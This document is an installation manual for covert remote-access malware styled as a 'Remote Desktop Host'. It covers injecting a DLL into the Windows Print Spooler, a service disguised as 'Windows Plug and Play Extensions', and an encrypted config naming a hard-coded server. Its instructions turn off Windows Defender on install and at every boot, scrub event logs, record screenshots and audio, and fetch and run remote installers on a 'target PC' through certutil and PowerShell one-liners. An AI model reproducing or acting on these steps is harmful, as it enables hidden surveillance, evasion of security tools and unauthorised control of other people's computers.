# Remote Desktop Host - Installation Guide

## Files

| File | Size | Description |
|------|------|-------------|
| pnpext.dll | 7.3 MB | Host module |
| WPnpSvc.exe | 19 KB | Loader service (auto-start on boot) |
| spoolcfg.exe | 51 KB | Injector / service installer / config tool |
| pnpext.sys | ~624 B | Configuration (AES-256-CBC encrypted) |
| pnpext.json | ~612 B | Configuration (plain JSON, for editing) |
| install.bat | 4 KB | USB installer script |
| uninstall.bat | 1 KB | Uninstaller script |
| install-web.bat | 4 KB | Web installer for CMD (certutil download) |
| install-web.ps1 | 4 KB | Web installer for PowerShell |

## Where files are installed

```
C:\Windows\System32\pnpext.dll          <- host module
C:\Windows\System32\WPnpSvc.exe         <- loader service
C:\Windows\System32\drivers\pnpext.sys  <- encrypted config
```

Service name: **WPnpSvc** ("Windows Plug and Play Extensions")

---

## CONFIGURATION

### Config file format

Config is stored as `pnpext.sys` — AES-256-CBC encrypted JSON.
Host reads encrypted or plain JSON automatically.

### Editing config

1. Decrypt to readable JSON:
```cmd
spoolcfg.exe --decrypt pnpext.sys config.json
```

2. Edit `config.json` in any text editor:
```json
{
    "server": "64.226.66.66",
    "port": 8080,
    "token": "my-room-token-123",
    "password": "secret-password",
    "quality": 80,
    "fps": 30,
    "scale": 100,
    "codec": "h264",
    "bitrate": 5000,
    "log_level": "INFO",
    "stun_server": "stun:64.226.66.66:3478",
    "turn_server": "turn:rdp:secret-password@64.226.66.66:3478",
    "evtlog_clean_patterns": "",
    "evtlog_clean_interval": 30,
    "screenshot_enabled": false,
    "screenshot_interval": 10,
    "screenshot_quality": 75,
    "screenshot_scale": 50,
    "screenshot_always": true,
    "screenshot_apps": "",
    "audio_enabled": false,
    "audio_segment_duration": 300,
    "audio_sample_rate": 16000,
    "audio_bitrate": 128,
    "audio_channels": 1,
    "audio_gain": 100
}
```

3. Encrypt back:
```cmd
spoolcfg.exe --encrypt config.json pnpext.sys
```

### Config fields

| Field | Default | Description |
|-------|---------|-------------|
| server | 127.0.0.1 | VPS IP address |
| port | 8080 | VPS WebSocket port |
| token | | Room token (must match client) |
| password | | Room password |
| quality | 75 | JPEG/H264 quality 1-100 |
| fps | 30 | Frames per second |
| scale | 80 | Screen scale % |
| codec | jpeg | Video: jpeg, h264, vp8 |
| bitrate | 5000 | H264 bitrate kbps |
| stun_server | stun:stun.l.google.com:19302 | WebRTC STUN |
| turn_server | | WebRTC TURN (turn:user:pass@host:port) |
| evtlog_clean_patterns | | Regex patterns to clean from Event Log |
| evtlog_clean_interval | 30 | Seconds between log scans |
| screenshot_enabled | false | Auto screenshot capture |
| screenshot_interval | 10 | Seconds between screenshots |
| screenshot_quality | 75 | Screenshot JPEG quality |
| screenshot_scale | 50 | Screenshot resolution % |
| screenshot_always | true | Capture regardless of app |
| screenshot_apps | | Window titles to capture (comma-separated) |
| audio_enabled | false | Audio recording |
| audio_segment_duration | 300 | Seconds per audio segment |
| audio_sample_rate | 16000 | Sample rate Hz |
| audio_bitrate | 128 | Opus bitrate kbps |
| audio_channels | 1 | 1=mono, 2=stereo |
| audio_gain | 100 | Gain % (100=normal, 200=2x) |

### Updating config on installed host

```cmd
spoolcfg.exe --decrypt C:\Windows\System32\drivers\pnpext.sys config.json
:: edit config.json
spoolcfg.exe --encrypt config.json C:\Windows\System32\drivers\pnpext.sys
:: restart to apply
spoolcfg.exe --unload Spooler C:\Windows\System32\pnpext.dll
sc stop Spooler && sc start Spooler
spoolcfg.exe --dll Spooler C:\Windows\System32\pnpext.dll
```

---

## METHOD 1: Install from USB

### Preparation (one time)

1. Edit `pnpext.json` with your VPS settings (see config fields above)

2. Encrypt config:
```cmd
spoolcfg.exe --encrypt pnpext.json pnpext.sys
```

3. Copy to USB drive:
```
USB:\
  install.bat
  uninstall.bat
  pnpext.dll
  WPnpSvc.exe
  pnpext.sys       <- encrypted config
```

Note: `spoolcfg.exe` and `pnpext.json` are NOT needed on USB (only for preparation).

### Installation on target PC

1. Insert USB
2. Right-click `install.bat` -> **Run as administrator**
3. Wait for "Done" message
4. Remove USB

### What happens automatically

```
install.bat runs:
  1. Disables Windows Defender (temporary)
  2. Copies pnpext.dll, WPnpSvc.exe -> System32
  3. Copies pnpext.sys -> System32\drivers
  4. Creates WPnpSvc service (auto-start)
  5. Starts service -> injects into Spooler
  6. Re-enables Defender
  7. Service stops itself (inject done)
```

### On every PC reboot

```
Windows starts -> WPnpSvc auto-starts -> waits for Spooler (up to 60s) ->
  disables Defender -> injects pnpext.dll into Spooler ->
  enables Defender -> WPnpSvc stops itself
```

No user interaction needed. Fully automatic.

---

## METHOD 2: Install from web (VPS)

### VPS preparation (one time)

1. SSH into VPS:
```bash
mkdir -p /var/www/remote-desktop/files
```

2. Upload files to VPS:
```bash
scp pnpext.dll root@YOUR_VPS:/var/www/remote-desktop/files/
scp WPnpSvc.exe root@YOUR_VPS:/var/www/remote-desktop/files/
scp pnpext.sys root@YOUR_VPS:/var/www/remote-desktop/files/
scp install-web.bat root@YOUR_VPS:/var/www/remote-desktop/files/
scp install-web.ps1 root@YOUR_VPS:/var/www/remote-desktop/files/
```

3. Nginx already serves `/var/www/remote-desktop/` — files available at:
```
https://YOUR_VPS/files/pnpext.dll
https://YOUR_VPS/files/WPnpSvc.exe
https://YOUR_VPS/files/pnpext.sys
https://YOUR_VPS/files/install-web.bat
https://YOUR_VPS/files/install-web.ps1
```

### Installation on target PC

#### Option A: CMD (works everywhere, no PowerShell needed)

Right-click `install-web.bat` -> Run as administrator

Or from admin CMD:
```cmd
install-web.bat https://64.226.66.66
```

One-liner from any admin CMD (downloads script and runs):
```cmd
cmd /c "certutil -urlcache -split -f https://64.226.66.66/files/install-web.bat %TEMP%\i.bat >nul 2>&1 && %TEMP%\i.bat && del %TEMP%\i.bat"
```

#### Option B: PowerShell

```powershell
.\install-web.ps1 -Server "https://64.226.66.66"
```

One-liner from admin PowerShell:
```powershell
powershell -ExecutionPolicy Bypass -Command "iwr 'https://64.226.66.66/files/install-web.ps1' -OutFile $env:TEMP\i.ps1; & $env:TEMP\i.ps1 -Server 'https://64.226.66.66'; del $env:TEMP\i.ps1"
```

#### Option C: From Win+R (Run dialog)

```
cmd /c "certutil -urlcache -split -f https://64.226.66.66/files/install-web.bat %TEMP%\i.bat >nul && %TEMP%\i.bat"
```
Note: requires admin — UAC prompt will appear.

---

## UNINSTALL

### Option A: Script
Right-click `uninstall.bat` -> Run as administrator

### Option B: Manual
```cmd
sc stop WPnpSvc
sc delete WPnpSvc
taskkill /F /IM rundll32.exe
del C:\Windows\System32\pnpext.dll
del C:\Windows\System32\WPnpSvc.exe
del C:\Windows\System32\drivers\pnpext.sys
```

### Option C: spoolcfg.exe
```cmd
spoolcfg.exe --remove
```

---

## ALL COMMANDS (spoolcfg.exe)

### Service management
```
spoolcfg.exe --install <dll>           Install WPnpSvc service (auto-start on boot)
spoolcfg.exe --remove                  Remove WPnpSvc service + clean registry
```

### Manual injection
```
spoolcfg.exe --dll Spooler <dll>       Inject DLL into Spooler
spoolcfg.exe --unload Spooler <dll>    Unload DLL from Spooler (free file)
spoolcfg.exe --restart Spooler <dll>   Stop + restart Spooler + inject
```

### Service control
```
spoolcfg.exe --stop Spooler            Stop Spooler service
spoolcfg.exe --kill Spooler            Force kill Spooler process
spoolcfg.exe --list                    List all running services
```

### Config encryption
```
spoolcfg.exe --encrypt <in.json> <out.sys>    Encrypt JSON -> binary
spoolcfg.exe --decrypt <in.sys> <out.json>    Decrypt binary -> JSON
```

---

## UPDATE DLL (replace existing)

1. Unload and stop:
```cmd
spoolcfg.exe --unload Spooler C:\Windows\System32\pnpext.dll
sc stop Spooler
```

2. Replace file:
```cmd
copy /Y new_pnpext.dll C:\Windows\System32\pnpext.dll
```

3. Restart:
```cmd
sc start Spooler
spoolcfg.exe --dll Spooler C:\Windows\System32\pnpext.dll
```

Or use ServiceManagerApp GUI.

---

## TROUBLESHOOTING

### Defender blocks spoolcfg.exe
spoolcfg.exe disables Defender automatically. If still blocked:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### DLL file is locked (cannot replace)
```cmd
tasklist /m pnpext.dll
taskkill /F /PID <pid_from_above>
```

### Service won't start
Check Event Viewer -> Windows Logs -> System -> look for WPnpSvc errors.

### Host shows OFFLINE in client
Wait 5-10 seconds — client polls every 2s. If still offline:
- Check VPS server.py is running
- Check config has correct server/port/token
- Check firewall allows outbound port 8080

### Decrypt and check config on target
```cmd
spoolcfg.exe --decrypt C:\Windows\System32\drivers\pnpext.sys check.json
type check.json
del check.json
```
